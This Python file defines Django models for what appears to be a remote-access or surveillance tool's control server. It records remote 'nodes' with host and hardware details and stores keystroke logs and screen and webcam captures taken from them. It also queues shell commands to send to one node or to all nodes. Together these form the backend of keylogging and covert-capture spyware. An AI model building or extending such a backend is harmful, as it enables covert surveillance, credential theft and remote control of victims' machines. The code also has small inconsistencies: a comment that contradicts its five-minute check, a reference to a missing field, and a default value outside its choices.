from django.db import models
from django.utils import timezone, dateformat
import datetime


def get_keylog_path(instance, filename):
    date_string = dateformat.format(timezone.now(), "%Y-%m-%d_%G-%i-%s")
    return f'nodes/{instance.node.uuid}/keylogs/{date_string}.log'


def get_image_path(instance, filename):
    date_string = dateformat.format(timezone.now(), "%Y-%m-%d_%G-%i-%s")
    if instance.type == "screencapture":
        return f'nodes/{instance.node.uuid}/screenCapture/{date_string}.png'
    elif instance.type == "camcapture":
        return f'nodes/{instance.node.uuid}/camCapture/{date_string}.png'


# Node related models
class Node(models.Model):
    # Connection Info
    uuid = models.CharField(max_length=128, unique=True,
                            null=False, blank=False)
    hash_sum = models.CharField(max_length=1024)
    host_name = models.CharField(max_length=512)
    ipv4 = models.GenericIPAddressField(protocol='IPv4')
    first_seen = models.DateTimeField(auto_now_add=True)
    last_seen = models.DateTimeField(auto_now=True)

    # Device Info
    os = models.CharField(max_length=512)
    os_release = models.CharField(max_length=512)
    os_version = models.CharField(max_length=512)
    processor = models.CharField(max_length=512)
    processor_count = models.IntegerField(null=True, blank=True)
    min_freq = models.FloatField()
    max_freq = models.FloatField()
    memory_total = models.IntegerField(null=True, blank=True)

    # Realtime info
    processor_freq = models.FloatField(null=True, blank=True)
    processor_temp = models.FloatField(null=True, blank=True)
    processor_usage = models.FloatField(null=True, blank=True)
    memory_usage = models.IntegerField(null=True, blank=True)

    def __str__(self):
        return self.uuid

    # if node has contacted server in last two hours, set as active
    def is_active(self):
        now = timezone.now()
        return self.last_seen >= now - datetime.timedelta(minutes=5)


class Disk(models.Model):
    name = models.CharField(max_length=512)
    disk_type = models.CharField(max_length=512)
    fs_type = models.CharField(max_length=512)
    mount_point = models.CharField(max_length=512)
    is_removable = models.BooleanField(default=False)
    total_disk = models.IntegerField()
    disk_usage = models.IntegerField()
    disk_write = models.IntegerField()
    disk_read = models.IntegerField()

    node = models.ForeignKey(Node, related_name='disks',
                             on_delete=models.CASCADE)

    def __str__(self):
        return f'{self.node.uuid}:{self.disk_name}'


class Command(models.Model):
    command_type = (
        ('shell', 'Shell'),
        ('macro', 'Macro'),
        ('scheduled', 'Scheduled'),
    )
    group_type = (
        ('all', 'All'),
        ('individual', 'Individual'),
    )

    node = models.ForeignKey(
        Node, related_name='commands', on_delete=models.CASCADE, null=True, blank=True)

    command_type = models.CharField(
        max_length=32, choices=command_type, default='shell')
    group = models.CharField(
        max_length=32, choices=group_type, default='all')

    command = models.TextField()

    repeat_at = models.TimeField(null=True, blank=True)
    issued_at = models.DateTimeField(auto_now_add=True)
    completed_at = models.DateTimeField(auto_now_add=False, null=True)

    def __str__(self):
        if self.node:
            return f'{self.node.uuid}:{self.command}'
        else:
            return f'{self.group}:{self.command}'


class Keylog(models.Model):
    node = models.ForeignKey(
        Node, related_name='keylogs', on_delete=models.CASCADE)

    log = models.TextField()
    timestamp = models.DateTimeField(auto_now_add=True)

    log_file = models.FileField(
        upload_to=get_keylog_path, max_length=512, unique=True)

    def __str__(self):
        return f'{self.node.uuid}:{self.timestamp}'


class Capture(models.Model):
    node = models.ForeignKey(
        Node, related_name='images', on_delete=models.CASCADE)

    capture_types = (
        ('screencapture', 'ScreenCapture'),
        ('camcapture', 'CamCapture'),
    )

    type = models.CharField(
        max_length=32, choices=capture_types, default='screenshot')

    capture = models.ImageField(
        upload_to=get_image_path, max_length=512, unique=True)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.node.uuid}:{self.type}:{self.timestamp}'
